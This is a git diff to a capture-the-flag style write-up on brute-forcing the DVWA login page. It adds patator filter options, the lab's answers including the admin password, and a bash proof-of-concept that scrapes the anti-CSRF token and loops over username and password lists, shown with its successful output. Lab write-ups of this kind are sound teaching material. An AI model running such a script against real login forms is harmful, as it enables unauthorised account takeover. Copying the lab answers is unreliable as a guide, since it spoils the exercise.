@@ -268,7 +268,15 @@ Add the -x ignore: action to the end of your existing patator command (right aft
 <p><em>Answer the questions below</em></p>
 
 <p>5.1. What action can we use to show only the correct password (the answer includes '  ')?<br>
-<code>Location Response Header</code></p>
+<code>-x ignore:fgrep='Location: login.php'</code></p>
+
+<br>
+
+<p>5.2 .What is the admin password? <br>
+<code>1qaz@WSX</code></p>
+
+<br>
+
 
 ```bash
 :~/BruteForceHeroes# apt install patator
@@ -314,14 +322,116 @@ Available modules:
   + dummy_test    : Testing module
 ```
 
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3a10bbd8-8efa-44a8-978e-b4c26c62cc69"></p>
+
+<p>
+
+- Method: <code>POST</code><br>
+- Cookie: <code>PHPSESSID=45eu1udsigp66r4dacbk2d14o7; security=impossible</code><br>
+- Data: <code>username=admin&password=password&Login=Login&user_token=642ad57c2e23f5ad18648f8798c1fb41</code><br>
+- Exit Condition: <ode>Location: login.php</code>
+
+</p>
+
+
+<h3>Patator</h3>
+
+<p>Did not work</p>
+
+<br>
+
+<h3>gotm1lk</h3>
+<p>https://blog.g0tmi1k.com/dvwa/login/</p>
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/51c62612-58e6-45b9-abf4-1564e0dfe08c"></p>
+
+<h4>PoC</h4>
+
+<p>
+
+- <code>passwords.txt</code> is the Task File downloaded<br>
+- <code>user.txt</code> is a file containing <code>admin</code></p>
+
+
+<p><em>PoC</em></p>
+
+```bash
+#!/bin/bash
+# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
+# Target: DVWA v1.10
+#   Date: 2015-10-19
+# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
+# Source: https://blog.g0tmi1k.com/dvwa/login/
+
+## Variables
+URL="http://10.201.107.100/login.php"
+USER_LIST="user.txt"
+PASS_LIST="passwords.txt"
+
+## Value to look for in response (Whitelisting)
+SUCCESS="Location: index.php"
+
+## Anti CSRF token
+CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
+[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1
+
+## Counter
+i=0
+
+## Password loop
+while read -r _PASS; do
+
+  ## Username loop
+  while read -r _USER; do
+
+    ## Increase counter
+    ((i=i+1))
+
+#    ## Feedback for user
+#    echo "[i] Try ${i}: ${_USER} // ${_PASS}"
+
+    ## Connect to server
+    #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
+    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
+    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'
+
+    ## Check response
+    echo "${REQUEST}" | grep -q "${SUCCESS}"
+    if [[ "$?" -eq 0 ]]; then
+      ## Success!
+      echo -e "\n\n[i] We did it ..."
+      echo        "[i] ---------- Username : ${_USER}"
+      echo        "[i] ---------- Password : ${_PASS}"
+      break 2
+    fi
+
+  done < ${USER_LIST}
+done < ${PASS_LIST}
+
+## Clean up
+rm -f /tmp/dvwa.cookie
+```
+
+<p>admin : Username : 1qaz@WSX</p>
+
+```bash
+:~/BruteForceHeroes# ./PoC
+
+
+[i] We did it ...
+[i] ---------- Username : admin
+[i] ---------- Password : 1qaz@WSX
+```
+
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e4f34daf-e280-4141-b711-b53a0da0f8d2"></p>
 
 
 <br>
 
-<p>5.2 .What is the admin password? <br>
-<code>Location Response Header</code></p>
 
-<br>
+
+
 
 
 
